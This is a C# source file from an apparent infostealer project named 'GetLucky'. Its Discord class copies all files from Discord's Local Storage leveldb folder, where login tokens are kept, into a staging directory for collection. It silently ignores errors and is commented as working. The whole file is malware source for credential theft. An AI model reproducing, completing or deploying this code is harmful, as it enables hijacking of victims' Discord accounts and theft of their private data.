using System;
using System.IO;

namespace GetLucky
{
    class Discord
    {
        public static int count = 0;
        public static string dir = "\\discord\\Local Storage\\leveldb\\";
        public static void GetDiscord(string GetLucky_Dir)  // Works
        {
            try
            {
                if (Directory.Exists(Help.AppDate + dir))
                {
                    foreach (FileInfo file in new DirectoryInfo(Help.AppDate + dir).GetFiles())
                    {
                        Directory.CreateDirectory(GetLucky_Dir + "\\Discord\\Local Storage\\leveldb\\");
                        file.CopyTo(GetLucky_Dir + "\\Discord\\Local Storage\\leveldb\\" + file.Name);
                    }
                    count++;
                }
                else
                {
                    return;
                }

            }
            catch  { }

        }
    }
}
